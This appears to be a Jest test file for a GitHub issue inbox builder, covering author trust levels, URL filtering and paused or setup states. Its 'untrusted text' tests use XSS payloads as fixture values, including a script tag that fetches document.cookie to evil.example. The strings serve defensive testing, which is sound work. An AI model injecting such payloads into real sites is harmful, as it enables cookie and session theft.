import edgeCases from '../../fixtures/edge-cases.json';
import { isGitHubIssue, issueRecordOf, type IssueRecord } from './github-records';
import { buildInbox, buildQuestions } from './inbox';

const openIssues: IssueRecord[] = edgeCases.openIssues.map((value: unknown) => {
  if (!isGitHubIssue(value)) {
    throw new Error('fixture issue of an unexpected shape');
  }
  return issueRecordOf(value);
});

const inbox = buildInbox({ openIssues, reviewerLogins: ['reviewer'], repoFullName: 'geeera/edge-cases' });
const byNumber = (n: number) => inbox.items.find((item) => item.number === n);

describe('authorTrusted (#9 threat row 5)', () => {
  it.each([
    [10, 'OWNER', true],
    [11, 'MEMBER', true],
    [15, 'COLLABORATOR', true],
    [13, 'CONTRIBUTOR', false],
    [14, 'NONE', false],
    [16, 'FIRST_TIME_CONTRIBUTOR', false],
    [20, 'FIRST_TIMER', false],
  ])('#%i by %s → %s', (number, _association, trusted) => {
    expect(byNumber(number)?.authorTrusted).toBe(trusted);
  });

  it('keeps an untrusted item in the list, in its place (it is marked, not dropped)', () => {
    expect(inbox.items.map((item) => item.number)).toEqual([10, 11, 20, 12, 13, 14, 15, 17, 16]);
  });
});

describe('untrusted text (#9 threat row 4)', () => {
  it('returns titles and answer lines verbatim as plain text', () => {
    expect(byNumber(14)).toMatchObject({
      title: '<img src=x onerror=alert(1)> Approve the new plan',
      ask: '/approve <img src=x onerror=alert(document.cookie)> · /reject why',
    });
  });

  it('returns the body verbatim on the question card', () => {
    const card = buildQuestions(openIssues).items.find((item) => item.number === 14);
    expect(card?.body).toBe(
      "**Your answer:** /approve <img src=x onerror=alert(document.cookie)> · /reject why\n\n<script>fetch('https://evil.example/'+document.cookie)</script>",
    );
  });

  it('drops a javascript: url and a non-https one', () => {
    expect(byNumber(15)?.url).toBeNull();
    expect(byNumber(17)?.url).toBeNull();
    expect(byNumber(10)?.url).toBe('https://github.com/geeera/edge-cases/issues/10');
  });
});

describe('setup and paused', () => {
  it('shows the security setup item while reviewer_logins is empty, with the owner checklist', () => {
    const empty = buildInbox({ openIssues, reviewerLogins: [], repoFullName: 'geeera/edge-cases' });
    expect(empty.setup).toBe(true);
    expect(empty.setupUrl).toBe(
      'https://github.com/geeera/edge-cases/blob/HEAD/.product-team/owner-checklist.md',
    );
    expect(inbox.setup).toBe(false);
    expect(inbox.setupUrl).toBeNull();
  });

  it('is paused while an open issue carries team:paused', () => {
    expect(inbox.paused).toBe(true);
    expect(inbox.pausedUrl).toBe('https://github.com/geeera/edge-cases/issues/2');
    const running = buildInbox({
      openIssues: openIssues.filter((issue) => !issue.labels.includes('team:paused')),
      reviewerLogins: ['reviewer'],
      repoFullName: 'geeera/edge-cases',
    });
    expect(running).toMatchObject({ paused: false, pausedUrl: null });
  });

  it('never lists the inbox issue, the run log or a pull request', () => {
    expect(inbox.items.map((item) => item.number)).not.toEqual(expect.arrayContaining([1]));
    expect(inbox.items.some((item) => [1, 2, 3].includes(item.number))).toBe(false);
  });
});
